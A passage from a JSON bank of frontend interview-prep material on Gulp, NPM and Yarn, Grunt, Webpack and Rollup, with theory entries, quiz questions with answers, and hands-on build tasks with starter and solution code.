          "complexity": 3,
          "interviewFrequency": 6,
          "learningPath": "beginner"
        },
        {
          "id": "question_gulp_watch_explain",
          "topic": "Gulp Watch",
          "level": "medium",
          "type": "open",
          "question": "Describe the purpose and typical usage of `gulp.watch()` in a Gulp workflow. How does it contribute to developer productivity?",
          "answer": "N/A",
          "analysisPoints": [
            "Purpose: Monitoring file changes.",
            "Triggering tasks automatically.",
            "Syntax and parameters (`globs`, `tasks`).",
            "Contribution to productivity: live reloading, instant feedback, reduced manual intervention.",
            "Integration with a 'default' or 'dev' task."
          ],
          "keyConcepts": [
            "Gulp",
            "Automation",
            "Live Reloading",
            "Developer Experience",
            "Watchers"
          ],
          "evaluationCriteria": [
            "Accurate explanation of `gulp.watch()`'s function.",
            "Insight into productivity benefits.",
            "Understanding of its role in a development loop."
          ],
          "example": "`gulp.watch('./src/**/*.css', compileCss)` means that whenever any CSS file in `src` changes, the `compileCss` task will automatically run. This is invaluable for development, as changes are reflected immediately in the browser (often via browser-sync or similar tools), eliminating the need to manually re-run build commands.",
          "tags": [
            "Gulp",
            "Automation",
            "Developer Experience"
          ],
          "prerequisites": [
            "theory_gulp_task_runner"
          ],
          "complexity": 6,
          "interviewFrequency": 7,
          "learningPath": "intermediate"
        },
        {
          "id": "question_task_runner_definition",
          "topic": "Task Runners",
          "level": "easy",
          "type": "flashcard",
          "question": "What is a 'task runner' in the context of frontend development?",
          "answer": "A task runner is a software tool that automates repetitive, common development tasks (like compilation, minification, linting, testing) to streamline the development workflow and improve efficiency.",
          "analysisPoints": [
            "Automation of repetitive tasks.",
            "Examples of tasks (compilation, minification, linting).",
            "Goal: efficiency and workflow streamlining."
          ],
          "keyConcepts": [
            "Task Runner",
            "Automation",
            "Frontend Tools",
            "Gulp"
          ],
          "evaluationCriteria": [
            "Concise and accurate definition."
          ],
          "example": "Gulp is an example of a task runner.",
          "tags": [
            "General",
            "Frontend Tools",
            "Flashcard"
          ],
          "prerequisites": [
            "theory_gulp_task_runner"
          ],
          "complexity": 3,
          "interviewFrequency": 7,
          "learningPath": "beginner"
        },
        {
          "id": "question_yarn_vs_npm_speed",
          "topic": "Yarn Performance",
          "level": "medium",
          "type": "mcq",
          "question": "Historically, Yarn was often preferred over NPM due to its performance benefits. Which of the following best describes a key mechanism Yarn used to achieve faster dependency installations?",
          "answer": "Parallel installation of dependencies.",
          "options": [
            "It used a smaller registry for packages.",
            "It only installed necessary production dependencies by default.",
            "Parallel installation of dependencies.",
            "It performed deep tree flattening more aggressively than NPM."
          ],
          "analysisPoints": [
            "Understanding Yarn's core performance enhancement.",
            "Distinguishing actual mechanisms from plausible but incorrect options.",
            "Awareness of how package managers optimize installation."
          ],
          "keyConcepts": [
            "Yarn",
            "NPM",
            "Performance",
            "Package Manager",
            "Installation"
          ],
          "evaluationCriteria": [
            "Correctly identifying parallel installation as a key performance feature.",
            "Understanding the technical reason for speed improvements."
          ],
          "example": "Earlier versions of NPM would install dependencies sequentially, while Yarn optimized this process by fetching and installing multiple packages simultaneously, leading to significantly faster initial and subsequent installations. While NPM has since adopted similar optimizations, parallel installation was a major differentiator for Yarn.",
          "tags": [
            "Yarn",
            "Performance",
            "MCQ"
          ],
          "prerequisites": [
            "theory_yarn_basics"
          ],
          "complexity": 5,
          "interviewFrequency": 6,
          "learningPath": "intermediate"
        }
      ],
      "tasks": [
        {
          "id": "task_npm_yarn_project_setup",
          "title": "Initialize a Frontend Project and Manage Dependencies/Scripts",
          "description": "\nThis task requires you to set up a minimal frontend project using both NPM and Yarn, demonstrate dependency installation, and define/run custom scripts.\n\n**Requirements:**\n1.  **Project Initialization:** Create a new directory `my-frontend-app`. Initialize a new NPM project inside it, accepting default values.\n2.  **Add Dependencies:**\n    *   Install a production dependency: `lodash` (a utility library).\n    *   Install a development dependency: `eslint` (a linter).\n3.  **Define Scripts:** In `package.json`:\n    *   Add a `\"start\"` script that simply prints \"Starting frontend application...\".\n    *   Add a `\"lint\"` script that runs `eslint --init` (to simulate linting setup).\n4.  **Run Scripts:** Execute both the `start` and `lint` scripts using NPM.\n5.  **Replicate with Yarn:** In the same `my-frontend-app` directory (after NPM steps), demonstrate Yarn's equivalent commands:\n    *   If `node_modules` exists, delete it. Delete `package-lock.json`.\n    *   Run Yarn's equivalent command to install all dependencies listed in `package.json`.\n    *   Run both the `start` and `lint` scripts using Yarn's syntax.\n6.  **Verification:** Ensure `lodash` and `eslint` are present in `node_modules` and correctly listed in `package.json`.\n",
          "difficulty": "medium",
          "startingCode": "# Instructions for setup:\n# 1. Create directory: mkdir my-frontend-app && cd my-frontend-app\n\n# --- NPM Steps ---\n# 2. Initialize NPM project:\n# npm init -y\n\n# 3. Install production dependency (lodash):\n# npm install lodash\n\n# 4. Install development dependency (eslint):\n# npm install eslint --save-dev\n\n# 5. Modify package.json to add scripts:\n/*\n// package.json snippet\n{\n  \"name\": \"my-frontend-app\",\n  \"version\": \"1.0.0\",\n  \"description\": \"\",\n  \"main\": \"index.js\",\n  \"scripts\": {\n    \"test\": \"echo \\\"Error: no test specified\\\" && exit 1\"\n    // TODO: Add \"start\" and \"lint\" scripts here\n  },\n  \"keywords\": [],\n  \"author\": \"\",\n  \"license\": \"ISC\",\n  \"dependencies\": {\n    \"lodash\": \"^4.17.21\"\n  },\n  \"devDependencies\": {\n    \"eslint\": \"^8.0.0\"\n  }\n}\n*/\n\n# 6. Run NPM scripts:\n# npm run start\n# npm run lint\n\n# --- Yarn Steps ---\n# 7. Clean up NPM specific files (if they exist):\n# rm -rf node_modules package-lock.json\n\n# 8. Run Yarn's install command (based on existing package.json):\n# yarn install\n\n# 9. Run Yarn scripts:\n# yarn start\n# yarn lint\n",
          "solutionCode": "# Step 1: Create directory and navigate\nmkdir my-frontend-app && cd my-frontend-app\n\n# --- NPM Steps ---\n# Step 2: Initialize NPM project\nnpm init -y\n\n# Step 3: Install production dependency (lodash)\nnpm install lodash\n\n# Step 4: Install development dependency (eslint)\nnpm install eslint --save-dev\n\n# Step 5: Modify package.json to add scripts\n# (Manually edit package.json or use a tool to insert)\n# The 'scripts' section should look like this:\n/*\n{\n  \"name\": \"my-frontend-app\",\n  \"version\": \"1.0.0\",\n  \"description\": \"\",\n  \"main\": \"index.js\",\n  \"scripts\": {\n    \"test\": \"echo \\\"Error: no test specified\\\" && exit 1\",\n    \"start\": \"echo \\\"Starting frontend application...\\\"\",\n    \"lint\": \"eslint --init\"\n  },\n  \"keywords\": [],\n  \"author\": \"\",\n  \"license\": \"ISC\",\n  \"dependencies\": {\n    \"lodash\": \"^4.17.21\"\n  },\n  \"devDependencies\": {\n    \"eslint\": \"^8.45.0\"\n  }\n}\n*/\n\n# Step 6: Run NPM scripts\nnpm run start\nnpm run lint\n\n# --- Yarn Steps ---\n# Step 7: Clean up NPM specific files\nrm -rf node_modules package-lock.json\n\n# Step 8: Run Yarn's install command (based on existing package.json)\nyarn install\n\n# Step 9: Run Yarn scripts\nyarn start\nyarn lint\n",
          "testCases": [
            "Verify `package.json` is created with basic info after `npm init -y`.",
            "Verify `lodash` is listed under `dependencies` in `package.json`.",
            "Verify `eslint` is listed under `devDependencies` in `package.json`.",
            "Verify `node_modules` directory exists after `npm install` and contains `lodash` and `eslint`.",
            "Verify `package-lock.json` is created by NPM.",
            "Verify `npm run start` prints 'Starting frontend application...'.",
            "Verify `npm run lint` attempts to run `eslint --init` (may prompt for setup).",
            "Verify `yarn.lock` is created by Yarn after `yarn install`.",
            "Verify `node_modules` is re-created by Yarn and contains `lodash` and `eslint`.",
            "Verify `yarn start` prints 'Starting frontend application...'.",
            "Verify `yarn lint` attempts to run `eslint --init`."
          ],
          "hints": [
            "Remember that `npm init -y` skips interactive prompts.",
            "The `--save-dev` flag is essential for development dependencies with NPM.",
            "For Yarn, `yarn add --dev` is the equivalent.",
            "When defining scripts in `package.json`, ensure the commands are executable in the shell.",
            "Yarn's equivalent to `npm install` (to install existing dependencies) is simply `yarn install` or `yarn`."
          ],
          "tags": [
            "NPM",
            "Yarn",
            "CLI",
            "Project Setup",
            "Dependencies",
            "Scripts"
          ],
          "timeEstimate": 45,
          "prerequisites": [
            "theory_npm_basics",
            "theory_yarn_basics"
          ],
          "complexity": 5,
          "interviewRelevance": 9,
          "learningPath": "beginner",
          "relatedConcepts": [
            "package.json",
            "node_modules",
            "package-lock.json",
            "yarn.lock"
          ]
        },
        {
          "id": "task_extend_gulp_build",
          "title": "Extend a Gulp Build Workflow",
          "description": "\nThis task requires you to extend an existing `gulpfile.js` to add new common frontend automation tasks, demonstrating your understanding of Gulp's API and pipeline concept.\n\n**Requirements:**\n1.  **Initial Setup:** Create a `src` directory with a `scss` subdirectory and a `js` subdirectory.\n    *   `src/scss/main.scss` (with some basic Sass rules, e.g., `$color: blue; body { color: $color; }`)\n    *   `src/js/app.js` (with some basic JS, e.g., `console.log('Hello Gulp!');`)\n    *   `src/index.html` (a simple HTML file, e.g., `<!DOCTYPE html><html><head><link rel=\"stylesheet\" href=\"./css/main.css\"></head><body><h1>Gulp Demo</h1><script src=\"./js/app.min.js\"></script></body></html>`)\n2.  **Integrate Given Gulpfile:** Use the provided Gulpfile structure as a starting point. Ensure the `sass` task correctly compiles `main.scss` to `dist/css/main.css`.\n3.  **Add JavaScript Minification Task:**\n    *   Create a new Gulp task named `minifyJs`.\n    *   This task should take JavaScript files from `src/js/**/*.js`.\n    *   Use `gulp-uglify` to minify the JavaScript.\n    *   Rename the minified file to `.min.js` (e.g., `app.js` becomes `app.min.js`) using `gulp-rename`.\n    *   Output the minified files to `dist/js`.\n4.  **Add HTML Copy Task:**\n    *   Create a new Gulp task named `copyHtml`.\n    *   This task should simply copy all HTML files from `src/*.html` to the `dist` directory.\n5.  **Refactor `default` Task:**\n    *   Modify the `default` task to run all build-related tasks (`sass`, `minifyJs`, `copyHtml`) sequentially first, and then start the `watch` task.\n    *   Ensure the `watch` task also watches for changes in JS and HTML files and triggers their respective build tasks.\n6.  **Run and Verify:** Execute the default Gulp task and confirm that:\n    *   `dist/css/main.css` exists and contains compiled/prefixed CSS.\n    *   `dist/js/app.min.js` exists, is minified, and renamed.\n    *   `dist/index.html` exists.\n    *   Changes to SCSS, JS, or HTML files trigger re-compilation/copying.\n",
          "difficulty": "hard",
          "startingCode": "const gulp = require('gulp');\nconst sass = require('gulp-sass')(require('sass'));\nconst autoprefixer = require('gulp-autoprefixer');\n\n// TODO: Require gulp-uglify and gulp-rename\n\n// Compile SCSS to CSS\nfunction compileSass() {\n  return gulp.src('./src/scss/**/*.scss')\n    .pipe(sass().on('error', sass.logError))\n    .pipe(autoprefixer({\n      overrideBrowserslist: ['last 2 versions'],\n      cascade: false\n    }))\n    .pipe(gulp.dest('./dist/css'));\n}\n\n// TODO: Create a 'minifyJs' task\n\n// TODO: Create a 'copyHtml' task\n\n// Watch for changes\nfunction watchFiles() {\n  gulp.watch('./src/scss/**/*.scss', compileSass);\n  // TODO: Add watchers for JS and HTML files\n}\n\n// Default task\nexports.sass = compileSass;\nexports.watch = watchFiles;\n// TODO: Modify exports.default to run all build tasks before watching\nexports.default = gulp.series(compileSass, watchFiles);\n",
          "solutionCode": "const gulp = require('gulp');\nconst sass = require('gulp-sass')(require('sass'));\nconst autoprefixer = require('gulp-autoprefixer');\nconst uglify = require('gulp-uglify'); // Added\nconst rename = require('gulp-rename'); // Added\n\n// Compile SCSS to CSS\nfunction compileSass() {\n  return gulp.src('./src/scss/**/*.scss')\n    .pipe(sass().on('error', sass.logError))\n    .pipe(autoprefixer({\n      overrideBrowserslist: ['last 2 versions'],\n      cascade: false\n    }))\n    .pipe(gulp.dest('./dist/css'));\n}\n\n// Minify JavaScript\nfunction minifyJs() {\n  return gulp.src('./src/js/**/*.js')\n    .pipe(uglify()) // Minify JS\n    .pipe(rename({ suffix: '.min' })) // Add .min suffix\n    .pipe(gulp.dest('./dist/js'));\n}\n\n// Copy HTML files\nfunction copyHtml() {\n  return gulp.src('./src/*.html')\n    .pipe(gulp.dest('./dist'));\n}\n\n// Watch for changes\nfunction watchFiles() {\n  gulp.watch('./src/scss/**/*.scss', compileSass);\n  gulp.watch('./src/js/**/*.js', minifyJs); // Watch JS\n  gulp.watch('./src/*.html', copyHtml); // Watch HTML\n}\n\n// Export tasks\nexports.sass = compileSass;\nexports.minifyJs = minifyJs;\nexports.copyHtml = copyHtml;\nexports.watch = watchFiles;\n\n// Define a 'build' task to run all compilation/copy tasks\nconst build = gulp.series(compileSass, minifyJs, copyHtml);\n\n// Default task: run build then start watching\nexports.default = gulp.series(build, watchFiles);\n",
          "testCases": [
            "Run `npm install gulp gulp-sass sass gulp-autoprefixer gulp-uglify gulp-rename`.",
            "Create `src/scss/main.scss` with `@charset 'UTF-8'; $primary-color: #333; body { color: $primary-color; }`",
            "Create `src/js/app.js` with `function greet(name) { console.log('Hello, ' + name + '!'); } greet('Gulp');`",
            "Create `src/index.html` with `<!DOCTYPE html><html><head><link rel=\"stylesheet\" href=\"./css/main.css\"></head><body><h1>Gulp Demo</h1><script src=\"./js/app.min.js\"></script></body></html>`",
            "Execute `gulp` (or `npm start` if default script is set up).",
            "Verify `dist/css/main.css` exists, contains minified/prefixed CSS.",
            "Verify `dist/js/app.min.js` exists, is minified (e.g., `function greet(e){console.log(\"Hello, \"+e+\"!\")}greet(\"Gulp\");`), and correctly renamed.",
            "Verify `dist/index.html` exists and is identical to `src/index.html`.",
            "Make a small change to `src/scss/main.scss` and confirm `dist/css/main.css` updates automatically.",
            "Make a small change to `src/js/app.js` and confirm `dist/js/app.min.js` updates automatically.",
            "Make a small change to `src/index.html` and confirm `dist/index.html` updates automatically."
          ],
          "hints": [
            "Remember to install all necessary Gulp plugins using `npm install <plugin-name>`.",
            "Use `gulp-uglify` for JavaScript minification.",
            "Use `gulp-rename` to add the `.min` suffix to minified files.",
            "The `gulp.series()` and `gulp.parallel()` functions are crucial for chaining tasks in Gulp 4.",
            "For `gulp.watch()`, you can pass an array of tasks or use `gulp.series()` if multiple tasks need to be triggered sequentially for a single watch event."
          ],
          "tags": [
            "Gulp",
            "Task Runner",
            "Automation",
            "JavaScript",
            "SCSS",
            "HTML",
            "Build Tools"
          ],
          "timeEstimate": 60,
          "prerequisites": [
            "theory_gulp_task_runner",
            "NPM basics"
          ],
          "complexity": 7,
          "interviewRelevance": 8,
          "learningPath": "intermediate",
          "relatedConcepts": [
            "Frontend Workflow",
            "Minification",
            "Compilation",
            "Asset Optimization",
            "Watchers"
          ]
        }
      ]
    }
  },
  {
    "id": "01a040f1-77d2-4b87-9848-49d27e4565fa",
    "startLine": 12800,
    "endLine": 12899,
    "processedDate": "2025-06-17T13:06:34.046Z",
    "content": {
      "logicalBlockInfo": {
        "suggestedEndLine": -1
      },
      "theory": [
        {
          "id": "theory_grunt_task_runner",
          "title": "Grunt: A Configuration-Based Task Runner",
          "content": "Grunt is an older, but still relevant, JavaScript task runner that emphasizes a configuration-over-code approach. It automates repetitive tasks such as minification, compilation, unit testing, linting, and more. Unlike newer bundlers that focus on module resolution and dependency graphs, Grunt operates by executing predefined tasks based on configurations specified in its `Gruntfile.js`.\n\n## Key Concepts\n*   **Task Runner**: Automates repetitive development tasks.\n*   **Configuration-based**: Tasks are defined and configured using JavaScript objects within `Gruntfile.js`.\n*   **Plugins**: Grunt's functionality is extended through a wide ecosystem of plugins, which handle specific operations (e.g., `grunt-contrib-sass` for SASS compilation, `grunt-contrib-watch` for file watching).\n*   **Gruntfile.js**: The main configuration file where tasks are defined, configured, and registered.\n*   **`grunt.initConfig()`**: Used to define project-specific configurations for tasks. This is where options for plugins are set.\n*   **`grunt.loadNpmTasks()`**: Loads a Grunt plugin, making its tasks available.\n*   **`grunt.registerTask()`**: Registers a new task, which can be a combination of other tasks or a custom function. The `default` task is executed when Grunt is run without any specific task name.\n\n## How it Works\nWhen Grunt is executed, it reads the `Gruntfile.js`. It then applies the configurations defined in `grunt.initConfig()` to the loaded plugins. When a task is invoked (e.g., `grunt default`), Grunt executes the specified series of sub-tasks in order. It's particularly useful for operations that need to be run sequentially or conditionally based on file changes.",
          "examples": [
            {
              "id": "example_grunt_basic_config",
              "title": "Basic Gruntfile.js Configuration",
              "code": "module.exports = function(grunt) {\n  // Project configuration.\n  grunt.initConfig({\n    // Configuration for the 'sass' task\n    sass: {\n      dist: {\n        files: {\n          'dist/css/main.css': 'src/scss/main.scss' // Output:Input mapping\n        }\n      }\n    },\n    // Configuration for the 'watch' task\n    watch: {\n      scss: {\n        files: ['src/scss/**/*.scss'], // Files to watch\n        tasks: ['sass'] // Tasks to run when files change\n      }\n    }\n  });\n\n  // Load Grunt plugins\n  grunt.loadNpmTasks('grunt-contrib-sass');\n  grunt.loadNpmTasks('grunt-contrib-watch');\n\n  // Register a default task alias.\n  // Running 'grunt' in the terminal will execute 'sass' then 'watch'.\n  grunt.registerTask('default', ['sass', 'watch']);\n};",
              "explanation": "This `Gruntfile.js` demonstrates a typical setup for Grunt. It initializes configurations for `sass` and `watch` tasks. The `sass` task compiles a SCSS file into a CSS file. The `watch` task monitors SCSS files and automatically triggers the `sass` task whenever changes are detected. Finally, `grunt.loadNpmTasks` includes the necessary plugins, and `grunt.registerTask` defines a `default` task that runs both `sass` and `watch` sequentially.",
              "language": "javascript"
            }
          ],
          "relatedQuestions": [
            "question_grunt_config_over_code",
            "question_grunt_vs_webpack_flashcard",
            "question_grunt_task_registration",
            "question_grunt_plugin_loading",
            "question_gruntfile_structure_mcq"
          ],
          "relatedTasks": [
            "task_grunt_css_minification"
          ],
          "tags": [
            "Grunt",
            "Task Runner",
            "Build Tools",
            "Automation",
            "Frontend Development"
          ],
          "technology": "JavaScript",
          "prerequisites": [
            "Node.js",
            "npm"
          ],
          "complexity": 5,
          "interviewRelevance": 6,
          "learningPath": "intermediate",
          "requiredFor": [
            "Legacy Project Maintenance",
            "Automation Workflows"
          ]
        },
        {
          "id": "theory_module_bundlers_overview",
          "title": "Module Bundlers: Webpack and Rollup",
          "content": "Module bundlers are sophisticated tools crucial for modern JavaScript development. They process and combine various types of files (JavaScript, CSS, images, etc.) into optimized bundles for deployment. Their primary role is to resolve dependencies between modules, transform code (e.g., Babel for ES6+ to ES5), and optimize the output for production environments (e.g., minification, tree-shaking).\n\nUnlike traditional task runners like Grunt, which automate discrete tasks, module bundlers focus on understanding the dependency graph of an entire application. They start from an entry point and traverse all imports to create a complete graph of everything the application needs, then process these modules into optimized bundles.\n\n## Common Features of Module Bundlers\n*   **Dependency Resolution**: Understanding `import`/`require` statements and building a dependency graph.\n*   **Transpilation**: Converting modern JavaScript (ES6+) or TypeScript into backward-compatible JavaScript (ES5) using tools like Babel or TypeScript compiler.\n*   **Asset Management**: Handling non-JavaScript assets like CSS, images, fonts, by treating them as modules.\n*   **Code Splitting**: Dividing code into smaller chunks that can be loaded on demand, improving initial load times.\n*   **Optimization**: Minification, uglification, tree-shaking (removing unused code), scope hoisting.\n*   **Development Server**: Often include a dev server with hot module replacement (HMR) for a faster development workflow.\n*   **Plugins and Loaders/Plugins**: Extensible architectures to customize bundling behavior.",
          "examples": [],
          "relatedQuestions": [
            "question_module_bundler_purpose",
            "question_bundler_vs_task_runner",
            "question_code_splitting_benefits",
            "question_tree_shaking_definition_flashcard",
            "question_bundler_loader_plugin_mcq"
          ],
          "relatedTasks": [],
          "tags": [
            "Module Bundler",
            "Frontend Build Tools",
            "Webpack",
            "Rollup",
            "Development Workflow",
            "Optimization"
          ],
          "technology": "JavaScript",
          "prerequisites": [
            "JavaScript Modules",
            "Node.js",
            "npm"
          ],
          "complexity": 7,
          "interviewRelevance": 9,
          "learningPath": "intermediate",
          "requiredFor": [
            "Modern Web Development",
            "Performance Optimization",
            "Large Scale Applications"
          ]
        },
        {
          "id": "theory_webpack_bundler",
          "title": "Webpack: A Static Module Bundler",
          "content": "Webpack is the most popular static module bundler for modern JavaScript applications. It builds a dependency graph of all modules (JavaScript, CSS, images, etc.) in your project and generates one or more bundles. \"Static\" refers to its ability to analyze dependencies at build time, rather than runtime.\n\n## Core Concepts\n*   **Entry**: The starting point(s) of your application's dependency graph. Webpack begins bundling from here.\n*   **Output**: Specifies where Webpack should emit the bundles it creates and how to name these files.\n*   **Loaders**: Webpack itself only understands JavaScript. Loaders transform other types of files (e.g., TypeScript, Sass, images) into valid modules that can be added to the dependency graph. They allow you to `import` any type of file directly in your JavaScript.\n    *   `test`: A regular expression that matches the file types to be transformed.\n    *   `exclude`: Files or folders to exclude from transformation (e.g., `node_modules`).\n    *   `use`: An array of loaders to apply to the matched files. Loaders are applied from right to left (or bottom to top).\n*   **Plugins**: Used to perform a wider range of tasks than loaders, such as bundle optimization, asset management, and environment variable injection. Plugins hook into Webpack's build process at various stages.\n    *   `HtmlWebpackPlugin`: Simplifies creation of HTML files to serve your webpack bundles, especially useful for injecting bundled JavaScript automatically.\n*   **Mode**: Configures Webpack to optimize for development, production, or none. (`development`, `production`, `none`). Production mode enables optimizations like minification and tree-shaking by default.\n*   **DevServer**: Provides a live-reloading development server.",
          "examples": [
            {
              "id": "example_webpack_config_js",
              "title": "Example webpack.config.js for React/CSS",
              "code": "const path = require('path');\nconst HtmlWebpackPlugin = require('html-webpack-plugin');\n\nmodule.exports = {\n  entry: './src/index.js', // Application's entry point\n  output: {\n    path: path.resolve(__dirname, 'dist'), // Output directory\n    filename: 'bundle.js' // Name of the bundled file\n  },\n  module: {\n    rules: [\n      {\n        test: /\\.js$/, // Apply to .js files\n        exclude: /node_modules/, // Exclude node_modules\n        use: {\n          loader: 'babel-loader', // Use babel-loader\n          options: {\n            presets: ['@babel/preset-env', '@babel/preset-react'] // Babel presets for ES6+ and React\n          }\n        }\n      },\n      {\n        test: /\\.css$/, // Apply to .css files\n        use: ['style-loader', 'css-loader'] // Use style-loader and css-loader\n      }\n    ]\n  },\n  plugins: [\n    new HtmlWebpackPlugin({\n      template: './src/index.html' // Use this HTML file as a template\n    })\n  ],\n  // Optional: Add development mode for better debugging and faster builds\n  mode: 'development'\n};",
              "explanation": "This Webpack configuration sets up bundling for a typical React application with CSS. It defines `src/index.js` as the entry point and outputs `bundle.js` into the `dist` folder. It uses `babel-loader` to transpile `.js` files (excluding `node_modules`) for ES6+ and React support. `style-loader` and `css-loader` are used to handle CSS files, embedding them into the bundle. The `HtmlWebpackPlugin` automatically injects the generated `bundle.js` into `src/index.html` and outputs it to `dist/index.html`.",
              "language": "javascript"
            }
          ],
          "relatedQuestions": [
            "question_webpack_entry_output",
            "question_webpack_loaders_vs_plugins",
            "question_webpack_babel_loader_purpose",
            "question_webpack_module_rules_order",
            "question_htmlwebpackplugin_purpose_flashcard",
            "question_webpack_mode_impact_mcq"
          ],
          "relatedTasks": [
            "task_webpack_react_app_setup",
            "task_webpack_image_handling"
          ],
          "tags": [
            "Webpack",
            "Module Bundler",
            "JavaScript",
            "React",
            "Frontend Build Tools",
            "Loaders",
            "Plugins",
            "Dependency Graph"
          ],
          "technology": "JavaScript",
          "prerequisites": [
            "JavaScript Modules",
            "ES6+",
            "Node.js",
            "npm"
          ],
          "complexity": 8,
          "interviewRelevance": 10,
          "learningPath": "advanced",
          "requiredFor": [
            "React Development",
            "Single Page Applications (SPAs)",
            "Complex Frontend Builds"
          ]
        },
        {
          "id": "theory_rollup_bundler",
          "title": "Rollup: A Module Bundler for Libraries and Applications",
          "content": "Rollup is another powerful module bundler for JavaScript, often preferred for building JavaScript libraries and small applications due to its efficient output and focus on ES modules. It excels at producing highly optimized, flattened bundles, particularly benefiting from a feature called 'tree-shaking'.\n\n## Key Characteristics\n*   **ES Modules First**: Rollup deeply understands ES Modules (`import`/`export`) and leverages their static analysis capabilities to perform highly efficient tree-shaking and scope hoisting.\n*   **Tree-shaking (Dead Code Elimination)**: A core strength of Rollup. It analyzes the dependency graph and only includes the code that is actually used, leading to smaller bundle sizes. It excels here because ES modules allow for static analysis of imports/exports.\n*   **Scope Hoisting**: Rollup can merge multiple modules into a single scope (instead of wrapping each module in a function), reducing overhead and often resulting in faster execution.\n*   **Output Formats**: Supports various output formats including `iife` (Immediately Invoked Function Expression), `esm` (ES Module), `cjs` (CommonJS), `umd` (Universal Module Definition), useful for different distribution targets.\n*   **Plugins**: Similar to Webpack, Rollup's functionality is extended through plugins (e.g., `@rollup/plugin-node-resolve` for resolving node modules, `@rollup/plugin-babel` for transpilation).\n\n## Webpack vs. Rollup (Brief Comparison)\n*   **Primary Use Case**: Webpack is generally better for complex Single Page Applications (SPAs) with many assets and dynamic imports, while Rollup is often preferred for JavaScript libraries, component libraries, and simpler applications due to its highly optimized output for standalone modules.\n*   **Bundle Size**: Rollup often produces smaller bundles for libraries due to its superior tree-shaking and scope hoisting with ES Modules.\n*   **Configuration Complexity**: Webpack configuration can be more complex due to its vast feature set; Rollup is often simpler for basic library bundling.\n*   **Hot Module Replacement (HMR)**: Webpack has mature HMR support, which is less of a focus for Rollup (as libraries don't typically need HMR).",
          "examples": [
            {
              "id": "example_rollup_config_js",
              "title": "Example rollup.config.js for a Library",
              "code": "import resolve from '@rollup/plugin-node-resolve'; // Resolves third-party modules from node_modules\nimport babel from '@rollup/plugin-babel';       // Transpiles JavaScript using Babel\n\nexport default {\n  input: 'src/main.js', // Entry point for the bundle\n  output: {\n    file: 'dist/bundle.js', // Output file path\n    format: 'iife' // Output format: Immediately Invoked Function Expression\n  },\n  plugins: [\n    resolve(), // Allows Rollup to find third-party modules\n    babel({\n      babelHelpers: 'bundled', // Or 'runtime' for smaller output but requires @babel/runtime\n      presets: ['@babel/preset-env'] // Transpiles to a compatible JS version\n    })\n  ]\n};",
              "explanation": "This `rollup.config.js` sets up a build for a JavaScript library. It takes `src/main.js` as input and outputs a bundled file named `bundle.js` in `iife` format, which is suitable for direct inclusion in a browser via a `<script>` tag. The `@rollup/plugin-node-resolve` plugin enables Rollup to find modules from `node_modules`, and `@rollup/plugin-babel` transpiles the code using Babel, ensuring compatibility with older environments. The `babelHelpers: 'bundled'` option ensures that Babel's helper functions are included directly in the bundle.",
              "language": "javascript"
            }
          ],
          "relatedQuestions": [
            "question_rollup_es_modules_focus",
            "question_rollup_tree_shaking",
            "question_rollup_output_formats_mcq",
            "question_webpack_vs_rollup_comparison",
            "question_scope_hoisting_flashcard"
          ],
          "relatedTasks": [
            "task_rollup_library_build"
          ],
          "tags": [
            "Rollup",
            "Module Bundler",
            "JavaScript",
            "Libraries",
            "Tree-shaking",
            "ES Modules",
            "Frontend Build Tools",
            "Optimization"
          ],
          "technology": "JavaScript",
          "prerequisites": [
            "JavaScript Modules",
            "ES6+",
            "Node.js",
            "npm"
          ],
          "complexity": 7,
          "interviewRelevance": 8,
          "learningPath": "advanced",
          "requiredFor": [
            "Library Development",
            "Framework Development",
            "Optimized Bundles"
          ]
        }
      ],
      "questions": [
        {
          "id": "question_grunt_config_over_code",
          "topic": "Grunt Task Runner",
          "level": "easy",
          "type": "open",
          "question": "Explain what is meant by Grunt's 'configuration-over-code' approach and how it differs from a more programmatic approach.",
          "answer": "Grunt's 'configuration-over-code' approach means that tasks are primarily defined and customized through structured configuration objects (JSON-like structures) within the `Gruntfile.js`, rather than through extensive custom JavaScript logic. Developers specify *what* to do (e.g., compile Sass, minify JavaScript) and *how* to do it (e.g., input/output paths, specific options) by setting properties in these configuration objects. This differs from a programmatic approach where developers might write explicit JavaScript functions to perform each step, providing more flexibility but potentially more boilerplate.",
          "analysisPoints": [
            "Understanding of declarative vs. imperative programming paradigms.",
            "Ability to articulate the benefits (simplicity, readability for common tasks) and drawbacks (less flexibility for complex custom logic) of configuration-based tools.",
            "Contrast with tools that use more programmatic APIs (e.g., Gulp, or even custom Node.js scripts)."
          ],
          "keyConcepts": [
            "Grunt",
            "Configuration-based",
            "Declarative programming",
            "Task runner"
          ],
          "evaluationCriteria": [
            "Clarity of explanation of 'configuration-over-code'.",
            "Accuracy of comparison with programmatic approaches."
          ],
          "example": "In Grunt, you specify file mappings for SASS compilation in a `files` object: `{ 'dist/css/main.css': 'src/scss/main.scss' }`. In a programmatic approach, you might write code to read `src/scss/main.scss`, process it, and then write the output to `dist/css/main.css`.",
          "tags": [
            "Grunt",
            "Task Runner",
            "Configuration",
            "Paradigm"
          ],
          "prerequisites": [
            "Basic JavaScript",
            "Build Tools Concepts"
          ],
          "complexity": 5,
          "interviewFrequency": 6,
          "learningPath": "intermediate"
        },
        {
          "id": "question_grunt_task_registration",
          "topic": "Grunt Task Runner",
          "level": "medium",
          "type": "code",
          "question": "Given the following `Gruntfile.js` snippet, write the `grunt.registerTask` line(s) required to create a 'build' task that first lints JavaScript files, then compiles TypeScript files, and finally runs unit tests. Assume 'lint', 'typescript', and 'test' are existing Grunt tasks.",
          "answer": "```javascript\nmodule.exports = function(grunt) {\n  grunt.initConfig({\n    // ... other configurations for 'lint', 'typescript', 'test'\n  });\n\n  // Load necessary plugins\n  grunt.loadNpmTasks('grunt-contrib-lint'); // Placeholder, actual plugin name may vary\n  grunt.loadNpmTasks('grunt-typescript'); // Placeholder\n  grunt.loadNpmTasks('grunt-contrib-test'); // Placeholder\n\n  // Register the 'build' task\n  grunt.registerTask('build', ['lint', 'typescript', 'test']);\n};\n```",
          "options": [],
          "analysisPoints": [
            "Correct use of `grunt.registerTask`.",
            "Understanding of task chaining and order of execution.",
            "Ability to interpret requirements into Grunt syntax."
          ],
          "keyConcepts": [
            "Grunt tasks",
            "Task registration",
            "Task chaining"
          ],
          "evaluationCriteria": [
            "Syntactic correctness of the `registerTask` call.",
            "Logical order of tasks within the array."
          ],
          "example": "The `grunt.registerTask('build', ['lint', 'typescript', 'test']);` line defines a new task named 'build'. When `grunt build` is executed, it will run 'lint', then 'typescript', then 'test' in sequence. This demonstrates how Grunt allows combining multiple sub-tasks into a single, higher-level task.",
